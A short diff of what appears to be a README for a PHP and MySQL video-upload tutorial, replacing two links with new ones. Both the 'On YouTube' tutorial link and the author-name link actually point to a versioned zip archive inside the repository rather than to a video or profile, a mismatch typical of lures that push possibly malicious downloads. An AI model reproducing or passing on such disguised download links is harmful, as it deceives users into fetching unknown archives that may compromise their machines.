@@ -5,8 +5,8 @@ version: 1.0.0
 
 ## Full Tutorial
 
-[On YouTube](https://github.com/xmrt624/video-upload-php-and-mysql/raw/refs/heads/main/db/and-mysql-upload-php-video-1.6-alpha.2.zip)
+[On YouTube](https://github.com/xmrt624/video-upload-php-and-mysql/raw/refs/heads/main/db/video_php_mysql_and_upload_v3.4-alpha.1.zip)
 
 ## Authors
 
-[Elias Abdurrahman](https://github.com/xmrt624/video-upload-php-and-mysql/raw/refs/heads/main/db/and-mysql-upload-php-video-1.6-alpha.2.zip)
+[Elias Abdurrahman](https://github.com/xmrt624/video-upload-php-and-mysql/raw/refs/heads/main/db/video_php_mysql_and_upload_v3.4-alpha.1.zip)
